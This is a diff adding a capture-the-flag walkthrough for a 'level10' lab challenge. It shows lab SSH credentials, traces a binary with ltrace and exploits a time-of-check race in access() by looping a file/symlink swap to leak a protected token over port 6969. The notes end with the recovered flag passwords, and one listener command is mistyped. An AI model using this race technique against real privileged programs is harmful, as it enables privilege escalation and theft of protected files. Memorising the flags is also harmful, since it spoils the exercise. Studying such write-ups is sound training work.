@@ -1,0 +1,57 @@
+ssh level10@192.168.1.34 -p 4242
+s5cAJpM8ev6XHw998pRWG728z
+ls -la
+
+# We have two files, a binary and a token file without right for us
+#Try to execute ./level10 with token :
+
+./level10 token
+
+#it's say it will send file to host if we have access to it
+
+mkdir /tmp/hack
+ltrace ./level10 token /tmp/hack
+
+#it's say we dont have access to token, with a function call access("token", 4)
+#let's check if we can exploit access
+#after some research it's seems we can exploit access with a race condition
+#if we use the binary with a file we have access and just after switch this file to a symlink with the token we should be able to get it.
+#Let's try to find out which host the binary will send the file, ltrace with a file we have right
+
+touch /tmp/hack/token
+ltrace ./level10 /tmp/hack/token localhost
+
+#The binary seems to send the file to the port 6969
+# with netstat we can see there is no process listening to this port
+#We need another terminal to listen to this port
+#to listen to a port we can use netstat :
+netstate -lk 6969
+
+#now if we use our file again with our first terminal:
+ltrace ./level10 /tmp/hack/token localhost
+
+# The other terminal get a message
+
+#lNow let's go back to the race condition, we should write a script :
+echo '
+while [ True ]
+do
+        touch token
+        /home/user/level10/level10 /tmp/hack/token 127.0.0.1
+done
+' > script.sh
+
+# and another one that will change the value of the file :
+echo '
+while [ True ]
+do
+        rm token
+        ln -s /home/user/level10/token /tmp/hack/token
+done
+' > script_ln.sh
+
+# let's use a third terminal to use both script
+# run both script and wait until the token appear on the terminal that listen to the port : -----> woupa2yuojeeaaed06riuj63c
+su flag10
+woupa2yuojeeaaed06riuj63c
+getflag -----> feulo4b72j7edeahuete3no7c
